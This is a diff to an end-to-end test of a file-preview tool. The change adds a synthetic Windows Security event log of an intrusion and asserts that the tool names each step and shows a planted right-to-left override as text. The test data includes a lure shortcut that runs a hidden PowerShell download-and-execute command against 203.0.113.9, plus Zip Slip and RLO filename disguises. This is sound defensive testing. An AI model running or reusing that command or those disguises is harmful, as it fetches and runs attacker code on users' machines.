@@ -68,6 +68,11 @@
  *     icon, its arguments padded out of sight, minimized, made on a VMware
  *     machine, bytes appended) and a Prefetch file (rclone run from TEMP)
  *     taken apart in the hex reader's own tabs;
+ *   - event logs (42j): an intrusion's Security log built at test time —
+ *     its every step named above the preview (a right-to-left override in
+ *     a service's path shown, not obeyed); the Events tab first, filtered
+ *     by event ID, by field and to the notable records; a record's every
+ *     value in the details; its bytes a click away in Hex;
  *   - macros (42h): a .docm, .xlsm, .doc and .ppt carrying a project built
  *     at test time — what runs by itself, Shell, the shellcode Declares,
  *     VBA stomping, a hidden module, a locked project, a form's text —
@@ -92,6 +97,7 @@ import { dropperPs1, installSh, leakedEnv } from "../lib/hostile-text.mjs";
 import { hostilePe } from "../lib/programs.mjs";
 import { hostileProject, oleWithVba, odfWithBasic, pptWithVba, withVba } from "../lib/vba.mjs";
 import { buildLnk, buildPrefetch } from "../lib/forensic.mjs";
+import { buildEvtx, intrusion } from "../lib/evtx.mjs";
 
 let chromium = null;
 try {
@@ -296,6 +302,8 @@ try {
 		// (Forensic artefacts, built when the test runs — tests/lib/forensic.mjs.)
 		{ name: "Invoice.pdf.lnk", mimeType: "application/octet-stream", buffer: Buffer.from(buildLnk({ target: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", args: `${" ".repeat(300)}-w hidden -nop -c iex(iwr http://203.0.113.9/p.ps1)`, icon: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", iconIndex: 11, name: "Invoice PDF", show: 7, tracker: { machine: "desktop-gor4ni", mac: "00:0c:29:ab:cd:ef", time: new Date("2026-02-28T09:30:00Z") }, appended: Uint8Array.from([0x50, 0x4b, 3, 4]) })) },
 		{ name: "RCLONE.EXE-1A2B3C4D.pf", mimeType: "application/octet-stream", buffer: Buffer.from(buildPrefetch({ exe: "RCLONE.EXE", hash: 0x1a2b3c4d, runCount: 3, runs: [new Date("2026-04-02T03:04:05Z"), new Date("2026-04-01T22:00:00Z")], files: ["\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}\\WINDOWS\\SYSTEM32\\NTDLL.DLL", "\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}\\USERS\\RIN\\APPDATA\\LOCAL\\TEMP\\RCLONE.EXE"], volume: { device: "\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}", serial: 0x4c3a1f2e, created: new Date("2025-11-20T08:00:00Z"), dirs: [] } })) },
+		// (An intrusion's event log, built when the test runs — tests/lib/evtx.mjs.)
+		{ name: "Security.evtx", mimeType: "application/octet-stream", buffer: Buffer.from(buildEvtx([...intrusion(), { provider: "Service Control Manager", id: 7045, channel: "System", level: 4, data: [["ServiceName", "Updater"], ["ImagePath", "C:\\Users\\Public\\invoice\u202efdp.exe"], ["AccountName", "LocalSystem"]] }])) },
 		{ name: "blob.xyz", mimeType: "application/octet-stream", buffer: Buffer.from("bytes of no format \u0000\u0001\u0002 gorani", "latin1") },
 		...["bundle.zip", "bundle.7z", "bundle.rar", "bundle.tar.gz", "bundle.iso", "korean.zip", "lure.zip", "infected.zip", "locked.7z", "liar.zip", "report.alz", "report.egg", "azo.egg"].map((name) => ({ name, mimeType: "application/octet-stream", buffer: fixture(name) })),
 		...["photo.jpg", "portrait.jpg", "redacted.jpg", "cropped.jpg", "polyglot.jpg", "generated.png", "bomb.png", "animated.gif", "photo.webp", "photo.avif", "scan.tiff", "photo.heic", "camera.dng", "camera.cr3", "camera.raf", "drawing.svg", "hostile.svg", "entities.svg"].map((name) => ({ name, mimeType: "application/octet-stream", buffer: fixture(name) })),
@@ -748,7 +756,7 @@ try {
 	d = await openDoc("lure.zip", "archive");
 	tells = await factsSay(/Zip Slip/);
 	for (const want of [/“\.\.\/\.\.\/evil\.txt”/, /absolute path, written wherever it names: “\/etc\/cron\.d\/gorani”/, /symbolic link: “passwd” → “\/etc\/passwd”/, /invoice\.pdf\.exe” \(it pretends to be \.pdf/, /invoice\[RLO\]fdp\.exe/, /Open me\.lnk” \(a Windows shortcut\)/, /The same path more than once: “report\.txt”/, /Comment: “Your invoice is attached”/]) assert.match(tells, want);
-	assert.doesNotMatch(tells, /‮/, "no direction control reaches the facts");
+	assert.doesNotMatch(tells, /\u202e/, "no direction control reaches the facts");
 	await rowOf(d, "invoice[RLO]fdp.exe").waitFor();
 	assert.equal(await rows(d).filter({ has: d.locator(".label", { hasText: /^report\.txt$/ }) }).count(), 2, "both report.txt entries shown");
 	await rowOf(d, "nested.zip").locator('[data-test="arc-open"]').click();
@@ -957,6 +965,37 @@ try {
 	await d.locator('[data-test="hex-prefetch-files"] .warn', { hasText: "\\USERS\\RIN\\APPDATA\\LOCAL\\TEMP\\RCLONE.EXE" }).waitFor();
 	await closeDoc();
 
+	// ── event logs (42j) ─────────────────────────────────────────────────
+	d = await openDoc("Security.evtx", "hex");
+	tells = await factsSay(/A Windows event log \(Security\): 52 events/);
+	for (const want of [/The Security log was cleared at .* by CORP\\user3/, /203\.0\.113\.9 tried 7 different accounts — password spraying/, /…then 203\.0\.113\.9 logged on as CORP\\user3 by Remote Desktop/, /PsExec's: a command run from another computer/, /DCSync/, /Kerberoasting/, /“C:\\Users\\Public\\invoice\[RLO\]fdp\.exe”/]) assert.match(tells, want);
+	assert.doesNotMatch(tells, /\u202e/, "a value's right-to-left override shown, not obeyed");
+	await d.locator('[data-test="hex-tab-events"][aria-pressed="true"]').waitFor();
+	const evCount = d.locator('[data-test="hex-events-count"]');
+	await evCount.getByText("52 of 52 events").waitFor({ timeout: 30_000 });
+	// An event ID; then the one event, every value of it, and why it is marked.
+	await d.locator('[data-test="hex-events-filter"]').fill("4624");
+	await evCount.getByText("1 of 52 events").waitFor();
+	await d.locator('[data-test="hex-events"] .evrow.notable').first().click();
+	await d.locator('[data-test="hex-event-why"]', { hasText: "a logon from 203.0.113.9, which had failed 30 times" }).waitFor();
+	await d.locator('[data-test="hex-event-data"] td', { hasText: "KALI" }).waitFor();
+	// A field: the 30 failures, the success, the admin share.
+	await d.locator('[data-test="hex-events-filter"]').fill("IpAddress=203.0.113.9");
+	await evCount.getByText("32 of 52 events").waitFor();
+	await d.locator('[data-test="hex-events-filter"]').fill("");
+	await d.locator('[data-test="hex-events-notable"]').check();
+	await evCount.getByText(/^(?:[1-9]|[1-4]\d|5[01]) of 52 events$/).waitFor();
+	await d.locator('[data-test="hex-events-notable"]').uncheck();
+	// A record: the planted override in its value shown as [RLO]; then its bytes.
+	await d.locator('[data-test="hex-events-filter"]').fill("#52");
+	await evCount.getByText("1 of 52 events").waitFor();
+	await d.locator('[data-test="hex-events"] .evrow').first().click();
+	await d.locator('[data-test="hex-event-data"] td', { hasText: "C:\\Users\\Public\\invoice[RLO]fdp.exe" }).waitFor();
+	await d.getByRole("button", { name: "Show its bytes in Hex" }).click();
+	await d.locator('[data-test="hex-tab-hex"][aria-pressed="true"]').waitFor();
+	await d.locator('[data-test="hex-status"]', { hasText: /^Offset 0x[0-9a-f]+ .* byte 0x2a \(42\)/ }).waitFor();
+	await closeDoc();
+
 	// ── macros (42h) ─────────────────────────────────────────────────────
 	d = await openDoc("invoice.docm", "docx");
 	tells = await factsSay(/Contains macros — a VBA project: 5 modules/);
@@ -1143,7 +1182,7 @@ try {
 		await phone.close();
 	}
 	await browser.close();
-	console.log("ok  e2e:preview — forensic formats (a lure shortcut and a Prefetch file taken apart); macros (a .docm, .xlsm, .doc, .ppt and OpenDocument Basic: what runs by itself, Shell, Declares, stomping, a hidden module named; the Macros pane; a module opened in the text reader); programs (mingw, gcc and clang builds taken apart in the hex reader; the hostile PE's every trick named; Go to, Find, strings; a program named .pdf caught; a sample inspected as bytes only, each inspection in the audit trail first); text (Markdown rendered and cleaned, JSON and XML trees with paths, a deep JSON and an XXE refused, a page shown as source, code highlighted, a dropper's lines and hidden command named, a leaked config masked, a log kept in the page); archives (ZIP, ALZ, EGG ours; 7z, RAR 5, TAR.GZ, ISO by 7-Zip) listed and walked, entries opened in previews of their own, a lure's tricks named, passwords asked and checked, 'infected' entries saved only as samples, a liar stopped, AZO named; pictures (JPEG, PNG, GIF, WebP, AVIF, TIFF pages, HEIF through libheif, DNG/CR3/RAF previews, SVG as a picture with its source) all in the frame, GPS named and copied, a redaction the thumbnail betrays, a crop, a polyglot, an AI mark, a bomb not drawn, disguises named, zoom/pan/pinch, the details pane's compact frame; email (.eml, .msg) with its facts, attachments opened in their own previews and one saved as a sample; Word, Excel, CSV, PowerPoint, 한글 (HWP, HWPX, a password), Word/PowerPoint 97, RTF, OpenDocument each drawn in the frame with its facts, every hostile file's tricks named and none run or fetched, disguised .doc files named, the default Trusted Types policy holding; the frame's own policy; a PDF drawn by pdf.js in an allow-scripts-only frame (pages, text, Korean through a CMap, search, facts), a hostile PDF's script never run and its link and attachment named; from inside the frame no cookie, storage, parent, API, network, popup or top navigation, and a frame that navigates is refused and closed; on a phone it fits and a swipe in the frame opens the next file");
+	console.log("ok  e2e:preview — forensic formats (a lure shortcut and a Prefetch file taken apart); event logs (an intrusion named step by step, a planted [RLO] shown, the Events tab filtered by ID, field and notable, a record's bytes in Hex); macros (a .docm, .xlsm, .doc, .ppt and OpenDocument Basic: what runs by itself, Shell, Declares, stomping, a hidden module named; the Macros pane; a module opened in the text reader); programs (mingw, gcc and clang builds taken apart in the hex reader; the hostile PE's every trick named; Go to, Find, strings; a program named .pdf caught; a sample inspected as bytes only, each inspection in the audit trail first); text (Markdown rendered and cleaned, JSON and XML trees with paths, a deep JSON and an XXE refused, a page shown as source, code highlighted, a dropper's lines and hidden command named, a leaked config masked, a log kept in the page); archives (ZIP, ALZ, EGG ours; 7z, RAR 5, TAR.GZ, ISO by 7-Zip) listed and walked, entries opened in previews of their own, a lure's tricks named, passwords asked and checked, 'infected' entries saved only as samples, a liar stopped, AZO named; pictures (JPEG, PNG, GIF, WebP, AVIF, TIFF pages, HEIF through libheif, DNG/CR3/RAF previews, SVG as a picture with its source) all in the frame, GPS named and copied, a redaction the thumbnail betrays, a crop, a polyglot, an AI mark, a bomb not drawn, disguises named, zoom/pan/pinch, the details pane's compact frame; email (.eml, .msg) with its facts, attachments opened in their own previews and one saved as a sample; Word, Excel, CSV, PowerPoint, 한글 (HWP, HWPX, a password), Word/PowerPoint 97, RTF, OpenDocument each drawn in the frame with its facts, every hostile file's tricks named and none run or fetched, disguised .doc files named, the default Trusted Types policy holding; the frame's own policy; a PDF drawn by pdf.js in an allow-scripts-only frame (pages, text, Korean through a CMap, search, facts), a hostile PDF's script never run and its link and attachment named; from inside the frame no cookie, storage, parent, API, network, popup or top navigation, and a frame that navigates is refused and closed; on a phone it fits and a swipe in the frame opens the next file");
 } finally {
 	await dev.close();
 }
